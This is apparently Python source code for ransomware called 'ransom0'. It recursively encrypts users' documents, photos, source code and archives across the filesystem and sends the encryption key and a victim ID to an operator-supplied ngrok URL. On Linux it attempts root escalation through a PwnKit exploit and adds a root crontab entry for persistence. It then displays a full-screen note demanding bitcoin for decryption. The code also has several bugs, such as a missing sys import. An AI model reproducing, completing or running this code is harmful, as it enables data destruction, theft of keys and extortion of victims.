import os
import platform 
import ssl 
import shutil 
import time
import requests
import ctypes
import subprocess
from datetime import datetime
from os import name, path
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import *
from random import randint

logs_path = '.logs/path.txt'
digits = randint(1111,9999) 
key = Fernet.generate_key()

url = '' # PUT THE URL YOU GOT FROM NGROK HERE

def escalade_linux():
    if os.getuid() == 0:
        return
    else:
        if subprocess.getstatusoutput('gcc')[0] == 127 :
            try: # vulnerable to pwnkit
                if subprocess.getstatusoutput('pkexec')[0] == 127 \
                and float(subprocess.getstatusoutput('pkexec --version')[1].split(sep=' ')[2]) < 0.101 \
                and 's' in subprocess.getstatusoutput('ls -al $(which pkexec)')[1].split(sep='-')[1] :

                    if subprocess.getstatusoutput('$(which gcc) -shared lin_exploit/PwnKit.c -o PwnKit -Wl,-e,entry -fPIC')[0] == 0:
                        subprocess.getstatusoutput('chmod +x lin_exploit/PwnKit')
                        subprocess.getstatusoutput(f'./lin_exploit/Pwnkit  {os.executable} {sys.argv[0]}')
                        exit()


            except:
                pass


def display_startup():
    if os.getuid() == 0:
        file = open('/etc/crontab','w') # add file in to crontab
        i = f"* * * * * root {sys.executable} {os.getcwd()+'/'+sys.argv[0]} \n"
        if i in open('/etc/crontab','r').read():
            return 
        file.write(i)
        file.close()
        return
    return False


class ransom0:

    username = os.getlogin()
    PATH = os.getcwd()


    EXCLUDE_DIRECTORY = (   '/usr', #Mac/Linux system directory
                            '/Library/',
                            '/System',
                            '/Applications',
                            '.Trash',
                            #Windows system directory
                            'Program Files',
                            'Program Files (x86)',
                            'Windows',
                            '$Recycle.Bin',
                            'AppData',
                            
                            'logs',

        )

    EXTENSIONS = (
        # '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
        '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
        '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
        '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies

        '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
        '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
        '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
        '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
        
        '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
        '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
        '.java', '.class', '.jar', # java source code
        '.ps', '.bat', '.vb', '.vbs' # windows based scripts
        '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
        '.go', '.py', '.pyc', '.bf', '.coffee', # other source code files

        '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
            )




    def clear(self): 
        subprocess.call('cls' if os.name == 'nt' else 'clear', shell=False)
        os.system('cls' if os.name == 'nt' else 'clear')

    def FindFiles(self):
        f = open(logs_path, "w")
        cnt = 0
        for root, dirs, files in os.walk("/"):
            #for root, dirs, files in os.walk("YOUR/TESTING/DIRECTORY"):
            if any(s in root for s in self.EXCLUDE_DIRECTORY):
                pass
            else:
                for file in files:
                     if file.endswith(self.EXTENSIONS):
                        TARGET = os.path.join(root, file)
                        f.write(TARGET+'\n')
                        print(root)

        f.close()
        f = open("logs/cnt.txt", "w")
        f.write(str(cnt))
        f.close()

    def Encrypt(self, filename):
        f = Fernet(key)
        with open(filename, "rb") as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(filename, "wb") as file:
            file.write(encrypted_data)
        print(filename)

def SendData(decrypted): 
    now = datetime.now()
    date = now.strftime("%d/%m/%Y %H:%M:%S")

    data = f'[{digits}, {key}, "{date}", "{decrypted}"]'

    requests.post(url, data)

ransom0 = ransom0()



def StartRansom():
    try:
        ransom0.FindFiles()
        if sys.platform == 'linux' and os.getuid() != 0:
            display_startup()
            escalade_linux()

        filepath = logs_path
        with open(filepath) as fp:
            line = fp.readline()
            while line:
                filename = line.strip()
                try:
                    ransom0.Encrypt(filename)
                except Exception:
                    print("!Permission denied")
                line = fp.readline()
        fp.close()
        SendData('false')
    except FileNotFoundError:
        os.mkdir("logs")
        f = open("logs/digits.txt", "w")
        f.write(str(digits))
        f.close()
        StartRansom()


StartRansom()

PATH = os.getcwd()




def DECRYPT_FILE():
    root= tk.Tk()
    width = root.winfo_screenwidth() # Get screen width
    height = root.winfo_screenheight() # Get screen height


    canvas1 = tk.Canvas(root, width = width, height = height, bg='black') # Main window
    canvas1.pack()

    label1 = tk.Label(root, text='YOUR FILES HAVE BEEN ENCRYPTED') # Title
    label1.config(font=('helvetica', int(height/20)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/15), window=label1)


    #img = tk.PhotoImage(file="lock.ppm")
    #img = img.subsample(2) 
    #img = img.zoom(1)
    #label = tk.Label(root, image=img)
    #label.config(background='black', foreground='red')
    #canvas1.create_window(width/2, height/4, window=label)


    label1 = tk.Label(root, text='YOUR IMPORTANT DOCUMENTS, DATAS, PHOTOS, VIDEOS HAVE BEEN ENCRYPTED WITH MILITARY GRADE ENCRYPTION AND A UNIQUE KEY.') # Title
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*8, window=label1)


    label1 = tk.Label(root, text='to decrypt them, send 50$ in bitcoin to BITCOIN_ADRESS, and them send proof of tranfer and your DIGITS to mail@mail.com') # Title
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*9, window=label1)

    label1 = tk.Label(root, text='YOUR DIGITS IS {}'.format(digits))# Display digits
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*10, window=label1)



    label1 = tk.Label(root, text='KEY:') # Title
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*11, window=label1)
    entry1 = tk.Entry(root) 
    canvas1.create_window(int(width/2), int(height/20)*12, window=entry1)


    def DECRYPT_FILE():

        def decrypt(filename):
            key = entry1.get()
            f = Fernet(key)
            with open(filename, "rb") as file:
                encrypted_data = file.read()
            decrypted_data = f.decrypt(encrypted_data)
            with open(filename, "wb") as file:
                file.write(decrypted_data)


        with open(logs_path) as fp:
            line = fp.readline()
            while line:
                filename = line.strip()
                try:
                    decrypt(filename)
                except PermissionError:
                    print("!Permission Denied")
                line = fp.readline()
        label1 = tk.Label(root, text='YOUR FILES HAVE BEEN DECRYPTED') # Title
        label1.config(font=('helvetica', int(height/50)))
        label1.config(background='black', foreground='red')
        canvas1.create_window(int(width/2), int(height/20)*15, window=label1)
        fp.close()
        shutil.rmtree(PATH+'/logs', ignore_errors=True)

        canvas1.create_window(int(width/2), 340, window=label1)  


    button1 = tk.Button(text='Decrypt', command=DECRYPT_FILE)
    button1.config(background='red')
    canvas1.create_window(int(width/2), int(height/20)*13, window=button1)

    root.mainloop()

    SendData('true')



if __name__ == '__main__':
    # Generate digits ID or read generated value from digits.txt
    if path.exists("logs") is True:
        i = f"{os.executable}/{sys.argv[0]}"
        if (subprocess.getstatusoutput(f"ps -aux |grep {i}")[1].count(sys.argv[0]) or subprocess.getstatusoutput(f"ps -aux |grep 'python3 {sys.argv[0]}'")[1].count(sys.argv[0])) > 3 :
            exit()
        f = open("logs/digits.txt", "r")
        digits = f.read()
        f.close()
        DECRYPT_FILE()
    else:
        os.mkdir("logs")
        f = open("logs/digits.txt", "w")
        f.write(str(digits))
        f.close()
        StartRansom()
